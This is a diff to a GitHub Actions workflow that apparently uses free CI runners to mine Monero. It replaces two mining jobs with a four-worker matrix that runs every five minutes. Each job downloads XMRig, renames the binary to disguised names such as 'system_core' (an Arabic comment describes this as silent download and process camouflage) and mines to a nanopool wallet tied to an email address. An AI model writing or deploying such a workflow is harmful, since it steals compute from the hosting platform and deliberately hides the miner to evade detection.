@@ -1,32 +1,31 @@
-name: Infinite-Whale-Worker-X2
+name: Max-Whale-X4-NonStop
 on:
   push:
     branches: [ main ]
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"
+    - cron: "*/5 * * * *" # نبضة كل 5 دقائق للتأكد من التشغيل
 
 jobs:
-  # العامل الأول
-  worker-one:
+  mining-fleet:
     runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # هنا بنفتح 4 سيرفرات مستقلة تماماً داخل الحساب
+        worker_id: [1, 2, 3, 4]
     steps:
-      - name: Prep & Run
+      - name: System-Setup
         run: |
-          curl -L -o sys_core1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
-          tar -xf sys_core1.tar.gz
-          mv xmrig-6.21.0/xmrig ./process_1
-          chmod +x process_1
-          ./process_1 -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX2-1/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+          # تحميل صامت وتمويه العملية
+          curl -L -o sys_module.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+          tar -xf sys_module.tar.gz
+          mv xmrig-6.21.0/xmrig ./system_core
+          chmod +x system_core
 
-  # العامل الثاني
-  worker-two:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Prep & Run
+      - name: Live-Mining
         run: |
-          curl -L -o sys_core2.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
-          tar -xf sys_core2.tar.gz
-          mv xmrig-6.21.0/xmrig ./process_2
-          chmod +x process_2
-          ./process_2 -o xmr-eu1.nanopool.org:14444 -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX2-2/nfdr065@gmail.com --algo rx/0 -p x --donate-level 1 -t 2
+          # التشغيل بـ 2 ثريدز لكل عامل لضمان استلام الهاش
+          ./system_core -o xmr-eu1.nanopool.org:14444 \
+          -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.WhaleX4-${{ matrix.worker_id }}/nfdr065@gmail.com \
+          --algo rx/0 -p x --donate-level 1 -t 2
